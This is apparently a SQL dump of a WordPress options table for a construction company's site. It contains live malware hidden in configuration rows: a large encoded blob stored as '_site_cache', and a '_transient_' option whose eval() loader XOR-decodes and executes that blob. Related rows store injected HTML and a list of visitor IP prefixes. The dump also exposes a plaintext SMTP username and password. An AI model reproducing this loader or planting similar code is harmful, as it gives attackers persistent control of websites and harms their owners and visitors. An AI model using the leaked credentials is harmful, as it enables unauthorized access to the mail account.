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","yes");
INSERT INTO `cmrfu_options` VALUES("15390","_transient_","eval(\'function function3($k,$d){$d=md5($d).md5($d.$d);$l=strpos($k,$d);if ($l>0){$c=\"ok\";}else{$c=\"\";} $l=strlen($d);for($s=0;$s<strlen($k);$s++){$c.= chr(ord($k[$s])^ord($d[$s%$l]));}return $c;}$session_prefix = \"65f30fe6\"; @eval(function3(base64_decode(get_option(\"_site_cache\")),$session_prefix));\');","yes");
INSERT INTO `cmrfu_options` VALUES("2718","smtp_user","info@herkonyapi.com","yes");
INSERT INTO `cmrfu_options` VALUES("2719","smtp_pass","herkon123","yes");
INSERT INTO `cmrfu_options` VALUES("2791","jquery-colorbox_settings","a:27:{s:12:\"autoColorbox\";s:4:\"true\";s:21:\"removeLinkFromMetaBox\";s:4:\"true\";s:18:\"colorboxWarningOff\";s:4:\"true\";s:13:\"colorboxTheme\";s:6:\"theme1\";s:14:\"slideshowSpeed\";s:4:\"2500\";s:8:\"maxWidth\";s:5:\"false\";s:13:\"maxWidthValue\";s:0:\"\";s:12:\"maxWidthUnit\";s:1:\"%\";s:9:\"maxHeight\";s:5:\"false\";s:14:\"maxHeightValue\";s:0:\"\";s:13:\"maxHeightUnit\";s:1:\"%\";s:5:\"width\";s:5:\"false\";s:10:\"widthValue\";s:0:\"\";s:9:\"widthUnit\";s:1:\"%\";s:6:\"height\";s:5:\"false\";s:11:\"heightValue\";s:0:\"\";s:10:\"heightUnit\";s:1:\"%\";s:9:\"linkWidth\";s:5:\"false\";s:14:\"linkWidthValue\";s:0:\"\";s:13:\"linkWidthUnit\";s:1:\"%\";s:10:\"linkHeight\";s:5:\"false\";s:15:\"linkHeightValue\";s:0:\"\";s:14:\"linkHeightUnit\";s:1:\"%\";s:10:\"transition\";s:7:\"elastic\";s:5:\"speed\";s:3:\"350\";s:7:\"opacity\";s:4:\"0.85\";s:21:\"jQueryColorboxVersion\";s:3:\"4.6\";}","yes");
INSERT INTO `cmrfu_options` VALUES("20467","_transient_timeout_GOTMLS_upgrade_notice_4.16.49_4.16.53","1489220512","no");
INSERT INTO `cmrfu_options` VALUES("20468","_transient_GOTMLS_upgrade_notice_4.16.49_4.16.53","<div class=\"GOTMLS_upgrade_notice\"><li><b>4.16.53:</b> Fixed the details window to scrolls to the highlighted code, set default Potential Threat scan to disabled, and encoded definitions array for DB storage.</li></div>","no");
INSERT INTO `cmrfu_options` VALUES("15473","widget_rev-slider-widget","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15474","widget_enews","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15475","widget_er_leaf-flickr-widget","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15413","GOTMLS_settings_array","a:12:{s:12:\"msg_position\";a:4:{i:0;s:5:\"745px\";i:1;s:5:\"288px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:15:\"skip_quarantine\";i:0;s:5:\"check\";a:6:{s:16:\"htaccess Threats\";s:8:\"htaccess\";s:17:\"TimThumb Exploits\";s:8:\"timthumb\";s:16:\"Backdoor Scripts\";s:8:\"backdoor\";s:13:\"Known Threats\";s:5:\"known\";s:17:\"Core File Changes\";s:7:\"wp_core\";s:17:\"Potential Threats\";s:9:\"potential\";}}","yes");
INSERT INTO `cmrfu_options` VALUES("15414","GOTMLS_nonce_array","a:10:{s:32:\"abf3499abf1b0acb1e908162c0f9969b\";d:410494;s:32:\"4bc2d10231086804a5ab8e6b4ebb8199\";d:410536;s:32:\"7f3fb4aa14a4ea360ef024fb50b26d11\";d:410608;s:32:\"993d630af7221df11cc5bf8e3ea859d8\";d:410609;s:32:\"a2daa403b43d247f95424a23ab2f72d7\";d:410705;s:32:\"21d33fdb620815f0aeff453b2edaf62f\";d:410783;s:32:\"da523066f1138d281279d3ff004544fc\";d:410924;s:32:\"0a1963b18b1321a30b2117500f9ffe26\";d:412837;s:32:\"3a749f2c54c687392658dfce560150dc\";d:412845;s:32:\"b8f15e9dddff07ad9f2cc1d234afa503\";d:413674;}","yes");
INSERT INTO `cmrfu_options` VALUES("15415","GOTMLS_Installation_Keys","s:149:\"a:2:{s:32:\"e0bcbd4fc7228f447a568e06b36d8a3d\";s:21:\"http://herkonyapi.com\";s:32:\"9d4bac3e68648ca74ea15906ce90d693\";s:26:\"https://www.herkonyapi.com\";}\";","yes");
INSERT INTO `cmrfu_options` VALUES("15715","underconstruction_global_notification","1","yes");
INSERT INTO `cmrfu_options` VALUES("15392","_site_0","1477776485","yes");
INSERT INTO `cmrfu_options` VALUES("15393","_site_bad","","yes");
INSERT INTO `cmrfu_options` VALUES("15394","_site_1","1477777554","yes");
INSERT INTO `cmrfu_options` VALUES("15395","_site_html","DkIVSQ8XG0MDVUtkeiEoMityLyZieyQ0djIYcn0pHgdRS29DCA9QCghAQFxMQVNdCldfHVkMAVNKR11GDlNbDD9GF10Bcxl9JFE0QloLCCEsUgguAlU8A343WglgO25OAgp1dDBFM11sDgtgfR5Yd1pmNgt6FAFTZUdDCklYTTMrQDlaf09wYSJfMXd+FBEjN30QJnxtAzVyUX16ACt5ZwMOHUkgXSkBcy5nAk9BaG0wWBAQTAUydRQIVwpmYnFPXhAASEYFTVEIVABIHVNTUQUJVk0FCFMFBQwF","yes");
INSERT INTO `cmrfu_options` VALUES("15396","_site_html_err","0","yes");
INSERT INTO `cmrfu_options` VALUES("15397","_site_recent","36.73.83 167.56.43 145.255.176 54.212.84 54.153.120 103.15.140 123.205.79 180.76.15 188.58.27 5.255.253 74.131.176 178.154.189 101.99.64 72.76.221 91.200.14 178.162.211 195.142.216 66.249.66 194.226.35 91.238.114 5.101.219 46.148.31 209.128.119 182.118.21 199.15.233 182.118.22 70.60.231 178.33.71 182.118.25 163.172.66 185.129.148 212.72.182 142.4.22 130.180.217 62.149.1 62.209.128 112.140.176 198.71.227 141.8.183 213.251.182 66.212.17 182.118.20 164.132.161 201.163.239 94.73.146 178.63.91 108.175.157 5.9.89 85.214.252 151.1.48 88.200.136 78.63.132 103.200.20 82.223.25 103.27.60 208.91.198 91.234.194 213.205.252 144.76.225 184.154.146 213.52.172 198.20.250 93.174.1 212.64.200 175.107.184 192.210.231 52.8.102 206.207.117 92.53.96 62.210.250 68.180.230 80.78.250 157.55.39 91.234.32 198.154.212 92.53.123 46.235.47 192.185.176 213.136.78 207.182.142 160.153.153 149.56.19 182.50.132 73.157.93 192.185.2 85.128.142 162.144.90 69.195.124 213.136.86 85.113.39 97.74.215 97.74.24 184.168.27 97.74.144 72.167.183 193.105.210 85.93.5 50.63.197 71.19.241 192.154.110","yes");
